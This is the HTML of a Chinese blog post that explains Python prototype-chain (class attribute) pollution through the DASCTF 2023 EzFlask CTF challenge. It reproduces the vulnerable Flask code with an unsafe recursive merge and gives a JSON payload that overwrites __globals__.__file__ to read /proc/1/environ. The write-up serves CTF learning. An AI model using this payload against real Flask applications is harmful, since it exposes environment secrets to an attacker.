@@ -1,0 +1,396 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Python原型链污染 | Gu0f3n's blog</title><meta name="author" content="Gu0f3n"><meta name="copyright" content="Gu0f3n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="leran from :https:&#x2F;&#x2F;pazuris.cn&#x2F;2023&#x2F;07&#x2F;27&#x2F;Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93&#x2F; Python原型链污染这个知识点应用的范围比较小，仅当题目中出现utils的merge或Pydash模块中的set和set_with函数才会用上 首先经典回顾一下python的类与继承：  在Python中，定">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python原型链污染">
+<meta property="og:url" content="https://gu0f3n.github.io/2024/11/22/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
+<meta property="og:site_name" content="Gu0f3n&#39;s blog">
+<meta property="og:description" content="leran from :https:&#x2F;&#x2F;pazuris.cn&#x2F;2023&#x2F;07&#x2F;27&#x2F;Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93&#x2F; Python原型链污染这个知识点应用的范围比较小，仅当题目中出现utils的merge或Pydash模块中的set和set_with函数才会用上 首先经典回顾一下python的类与继承：  在Python中，定">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Gu0f3n/img/mian/mmexport1732259652906.jpg">
+<meta property="article:published_time" content="2024-11-22T07:12:18.000Z">
+<meta property="article:modified_time" content="2024-11-25T04:52:55.992Z">
+<meta property="article:author" content="Gu0f3n">
+<meta property="article:tag" content="python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Gu0f3n/img/mian/mmexport1732259652906.jpg"><link rel="shortcut icon" href="/img/1.png"><link rel="canonical" href="https://gu0f3n.github.io/2024/11/22/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
+      const saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+      
+      window.btf = {
+        saveToLocal: saveToLocal,
+        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+          script.src = url
+          script.async = true
+          script.onerror = reject
+          script.onload = script.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            script.onload = script.onreadystatechange = null
+            resolve()
+          }
+
+          Object.keys(attr).forEach(key => {
+            script.setAttribute(key, attr[key])
+          })
+
+          document.head.appendChild(script)
+        }),
+
+        getCSS: (url, id = false) => new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+          link.rel = 'stylesheet'
+          link.href = url
+          if (id) link.id = id
+          link.onerror = reject
+          link.onload = link.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            link.onload = link.onreadystatechange = null
+            resolve()
+          }
+          document.head.appendChild(link)
+        }),
+
+        addGlobalFn: (key, fn, name = false, parent = window) => {
+          const pjaxEnable = true
+          if (!pjaxEnable && key.startsWith('pjax')) return
+
+          const globalFn = parent.globalFn || {}
+          const keyObj = globalFn[key] || {}
+    
+          if (name && keyObj[name]) return
+    
+          name = name || Object.keys(keyObj).length
+          keyObj[name] = fn
+          globalFn[key] = keyObj
+          parent.globalFn = globalFn
+        }
+      }
+    
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+      
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })()</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Python原型链污染',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-25 12:52:55'
+}</script><link rel="stylesheet" href="/css/1.css?1"><link rel="stylesheet" href="/css/2.css?1"><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Gu0f3n's blog" type="application/atom+xml">
+</head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw &lt;i class=&quot;fa-light fa-igloo&quot;&gt;&lt;/i&gt;"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa-sharp-duotone fa-solid fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-solid fa-heart-pulse"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/Gu0f3n/img/mian/mmexport1732259652906.jpg')"><nav id="nav"><div id="nav-group"><span id="blog-info"><a href="/" title="回到主页"><span class="site-name"></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw &lt;i class=&quot;fa-light fa-igloo&quot;&gt;&lt;/i&gt;"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa-sharp-duotone fa-solid fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-solid fa-heart-pulse"></i><span> 关于我</span></a></div></div></div><div id="nav-right"><div id="travellings"><a class="site-page" target="_blank" rel="noopener" href="https://travellings.cn/go.html" title="随机前往一个开往项目网站"><i class="iconfont icat-subway"></i></a></div><div id="random"><a class="site-page" href="javascript:toRandomPost()" title="随机前往一个文章"><i class="iconfont icat-random"></i></a></div><div id="search-button"><a class="site-page social-icon search"><i class="iconfont icat-search"></i></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="搜索本站文章"><i class="iconfont icat-bars"></i></a></div></div></div></nav><div id="post-info"><h1 class="post-title">Python原型链污染</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-22T07:12:18.000Z" title="发表于 2024-11-22 15:12:18">2024-11-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-25T04:52:55.992Z" title="更新于 2024-11-25 12:52:55">2024-11-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pollute/">pollute</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Python原型链污染"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>leran from :<a target="_blank" rel="noopener" href="https://pazuris.cn/2023/07/27/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://pazuris.cn/2023/07/27/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p>
+<h1 id="Python原型链污染"><a href="#Python原型链污染" class="headerlink" title="Python原型链污染"></a>Python原型链污染</h1><p>这个知识点应用的范围比较小，仅当题目中出现<code>utils</code>的<code>merge</code>或<code>Pydash</code>模块中的<code>set</code>和<code>set_with</code>函数才会用上</p>
+<p>首先经典回顾一下python的类与继承：</p>
+<ul>
+<li>在Python中，定义类是通过<code>class</code>关键字，<code>class</code>后面紧接着是类名，紧接着是<code>(object)</code>，表示该类是从哪个类继承下来的，所有类的本源都是object类</li>
+<li>可以自由地给一个实例变量绑定属性，像js</li>
+<li>由于类可以起到模板的作用，因此，可以在创建实例的时候，把一些我们认为必须绑定的属性强制填写进去。通过定义一个特殊的<code>__init__</code>方法，在创建实例的时候，就把类内置的属性绑上</li>
+<li>注意到<code>__init__</code>方法的第一个参数永远是<code>self</code>，表示创建的实例本身，因此，在<code>__init__</code>方法内部，就可以把各种属性绑定到<code>self</code>，因为<code>self</code>就指向创建的实例本身。</li>
+<li>当我们定义了一个类属性后，这个属性虽然归类所有，但类的所有实例都可以访问到</li>
+<li>判断一个变量是否是某个类型可以用<code>isinstance()</code>判断。</li>
+</ul>
+<p>在Python中每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。</p>
+<h2 id="DASCTF-2023-0X401七月暑期挑战赛-EzFlask"><a href="#DASCTF-2023-0X401七月暑期挑战赛-EzFlask" class="headerlink" title="[DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask"></a>[DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)<span class="comment">#用于创建一个 Flask 应用实例</span></span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())<span class="comment">#设置 Flask 应用的密钥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment">#遍历 src，递归合并数据到 dst，支持字典合并和对象属性动态更新。</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment">#@app.route 是一个装饰器</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:<span class="comment">#检查请求中是否有数据</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#使用 try...except 捕获所有可能的异常，确保程序不会因为意外错误而崩溃</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):<span class="comment">#假定是一个自定义的函数，用于验证请求数据的合法性</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)<span class="comment">#将请求中的原始数据（字节流）解析为 Python 字典,如果解析失败,返回 &quot;Register Failed&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)<span class="comment">#将 data 中的键值对合并到用户实例 User 中</span></span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure>
+
+<p>看到merge函数基本想到的就是python原型链污染</p>
+<p>利用merge来动态污染原型链的值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;:&quot;111&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;222&quot;,</span><br><span class="line">    &quot;__class__&quot;:&#123;</span><br><span class="line">        &quot;check&quot;:&#123;</span><br><span class="line">            &quot;__globals__&quot;:&#123;</span><br><span class="line">                &quot;__file__&quot; : &quot;/proc/1/environ&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后直接get &#x2F;就好</p>
+<p>象征性的复现一下(●’◡’●)</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Gu0f3n.github.io">Gu0f3n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://gu0f3n.github.io/2024/11/22/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://gu0f3n.github.io/2024/11/22/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Gu0f3n.github.io" target="_blank">Gu0f3n's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/python/">python</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/Gu0f3n/img/mian/mmexport1732259652906.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/11/25/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%9D%E6%8E%A2/" title="js原型链污染初探"><img class="cover" src="https://raw.githubusercontent.com/Gu0f3n/img/mian/mmexport1732504621994.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">js原型链污染初探</div></div></a></div><div class="next-post pull-right"><a href="/2024/11/19/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Pickle反序列化"><img class="cover" src="https://raw.githubusercontent.com/Gu0f3n/img/mian/mmexport1731986246004.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Pickle反序列化</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/09/11/python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/" title="python基础学习"><img class="cover" src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image-1726039895634-3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-11</div><div class="title">python基础学习</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Gu0f3n</div><div class="author-info__description">石匠敲击石头的101次</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Gu0f3n?tab=repositories"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Gu0f3n?tab=repositories" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://weibo.com/u/3833024804" target="_blank" title="microblog"><i class="fa-brands fa-microblog" style="color: #FF0000;"></i></a><a class="social-icon" href="https://space.bilibili.com/282616786?spm_id_from=333.337.0.0" target="_blank" title="Bilibili"><i class="fa-brands fa-bilibili" style="color: #FFC0CB;"></i></a><a class="social-icon" href="https://www.douyin.com/user/MS4wLjABAAAA13z3eSKpDESynATlUFIUGCPdSHi7oID9u2rz2bHH6aE" target="_blank" title="tiktok"><i class="fa-brands fa-tiktok" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.</span> <span class="toc-text">Python原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DASCTF-2023-0X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-EzFlask"><span class="toc-number">1.1.</span> <span class="toc-text">[DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/25/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%9D%E6%8E%A2/" title="js原型链污染初探"><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/mmexport1732504621994.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="js原型链污染初探"/></a><div class="content"><a class="title" href="/2024/11/25/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%9D%E6%8E%A2/" title="js原型链污染初探">js原型链污染初探</a><time datetime="2024-11-25T02:36:10.000Z" title="发表于 2024-11-25 10:36:10">2024-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/22/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="Python原型链污染"><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/mmexport1732259652906.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python原型链污染"/></a><div class="content"><a class="title" href="/2024/11/22/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="Python原型链污染">Python原型链污染</a><time datetime="2024-11-22T07:12:18.000Z" title="发表于 2024-11-22 